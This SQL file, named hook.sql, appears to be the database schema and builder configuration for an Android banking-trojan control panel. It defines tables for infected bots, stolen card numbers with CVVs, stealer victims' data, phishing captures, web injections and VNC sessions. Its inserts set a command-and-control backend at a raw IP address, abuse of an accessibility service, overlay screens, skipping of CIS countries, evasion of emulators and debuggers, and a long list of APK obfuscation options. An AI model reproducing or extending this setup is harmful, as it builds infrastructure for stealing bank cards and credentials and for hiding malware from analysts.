-- File: hook.sql

-- Table: Bots
CREATE TABLE Bots (
    id INT PRIMARY KEY,
    bot_name VARCHAR(100),
    status VARCHAR(50),
    last_activity TIMESTAMP
);

-- Table: Banks
CREATE TABLE Banks (
    id INT PRIMARY KEY,
    bank_name VARCHAR(100),
    country VARCHAR(50),
    total_assets DECIMAL(15, 2)
);

-- Table: Cards
CREATE TABLE Cards (
    id INT PRIMARY KEY,
    card_number VARCHAR(16),
    card_holder VARCHAR(100),
    expiration_date DATE,
    cvv VARCHAR(4)
);

-- Table: Crypt
CREATE TABLE Crypt (
    id INT PRIMARY KEY,
    algorithm VARCHAR(50),
    key_length INT,
    encrypted_data BLOB
);

-- Table: Wallet
CREATE TABLE Wallet (
    id INT PRIMARY KEY,
    user_id INT,
    balance DECIMAL(15, 2),
    currency VARCHAR(10),
    last_transaction TIMESTAMP
);

-- Table: Stealers
CREATE TABLE Stealers (
    id INT PRIMARY KEY,
    victim_id INT,
    stolen_data TEXT,
    date_stolen TIMESTAMP
);

-- Table: Email
CREATE TABLE Email (
    id INT PRIMARY KEY,
    sender VARCHAR(100),
    recipient VARCHAR(100),
    subject VARCHAR(255),
    message TEXT,
    sent_date TIMESTAMP
);

-- Table: Shops
CREATE TABLE Shops (
    id INT PRIMARY KEY,
    shop_name VARCHAR(100),
    location VARCHAR(100),
    total_sales DECIMAL(15, 2)
);

-- Table: VNC
CREATE TABLE VNC (
    id INT PRIMARY KEY,
    connection_ip VARCHAR(15),
    port INT,
    username VARCHAR(50),
    connected_at TIMESTAMP
);

-- Table: Users
CREATE TABLE Users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    email VARCHAR(100),
    registration_date DATE,
    last_login TIMESTAMP
);

-- Table: Fishing
CREATE TABLE Fishing (
    id INT PRIMARY KEY,
    phishing_url VARCHAR(255),
    target_id INT,
    captured_data TEXT,
    capture_date TIMESTAMP
);

-- Table: Injections
CREATE TABLE Injections (
    id INT PRIMARY KEY,
    target_url VARCHAR(255),
    injection_type VARCHAR(50),
    success BOOLEAN,
    attempt_date TIMESTAMP
);

-- Table: Permissions
CREATE TABLE Permissions (
    id INT PRIMARY KEY,
    user_id INT,
    permission_type VARCHAR(50),
    granted_date DATE
);

-- Table: FileManager
CREATE TABLE FileManager (
    id INT PRIMARY KEY,
    file_name VARCHAR(255),
    file_size INT,
    uploaded_by INT,
    upload_date TIMESTAMP
);

-- Table: General Stats
CREATE TABLE GeneralStats (
    id INT PRIMARY KEY,
    stat_name VARCHAR(100),
    stat_value DECIMAL(15, 2),
    recorded_at TIMESTAMP
);

-- Table: Smart Injections
CREATE TABLE SmartInjections (
    id INT PRIMARY KEY,
    target_url VARCHAR(255),
    injected_code TEXT,
    injection_date TIMESTAMP
);

-- Table: Auto Commands
CREATE TABLE AutoCommands (
    id INT PRIMARY KEY,
    command_name VARCHAR(50),
    description TEXT,
    last_executed TIMESTAMP
);

-- Application Configuration
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('URL backend connect', 'http://185.215.113.25:3434', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Backend encryption key', 'EncryptionKey', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Initial Vector', 'InitialVector', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Application name', 'Application', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Accessibility Service name', 'Accessibility Service', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Tag', 'tag', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('White app', 'org.telegram.messenger', CURRENT_TIMESTAMP);

-- Build parameters
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Ignore emulators debuggers', 'true', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Ignore CIS', 'true', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Add wait overlay', 'true', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('No mutate and crypt code', 'true', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Build for Injector', 'true', CURRENT_TIMESTAMP);

INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Build package for Xiaomi', 'true', CURRENT_TIMESTAMP);

-- Crypt APK
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Crypt APK', 'true', CURRENT_TIMESTAMP);

-- DebugRemoval
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('DebugRemoval', 'true', CURRENT_TIMESTAMP);

-- GoTo
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('GoTo', 'true', CURRENT_TIMESTAMP);

-- LibEncryption
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('LibEncryption', 'true', CURRENT_TIMESTAMP);

-- CallInDirection*
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('CallInDirection*', 'true', CURRENT_TIMESTAMP);

-- MethodRename
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('MethodRename', 'true', CURRENT_TIMESTAMP);

-- AssetEncryption
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('AssetEncryption', 'true', CURRENT_TIMESTAMP);

-- MethodOverload*
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('MethodOverload*', 'true', CURRENT_TIMESTAMP);

-- ResStringEncryption
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('ResStringEncryption', 'true', CURRENT_TIMESTAMP);

-- ArithmeticBranch*
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('ArithmeticBranch*', 'true', CURRENT_TIMESTAMP);

-- Reflection
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Reflection', 'true', CURRENT_TIMESTAMP);

-- AdvancedReflection
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('AdvancedReflection', 'true', CURRENT_TIMESTAMP);

-- Reorder*
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('Reorder*', 'true', CURRENT_TIMESTAMP);

-- RandomManifest
INSERT INTO GeneralStats (stat_name, stat_value, recorded_at)
VALUES ('RandomManifest', 'true', CURRENT_TIMESTAMP);

-- End of hook.sql file
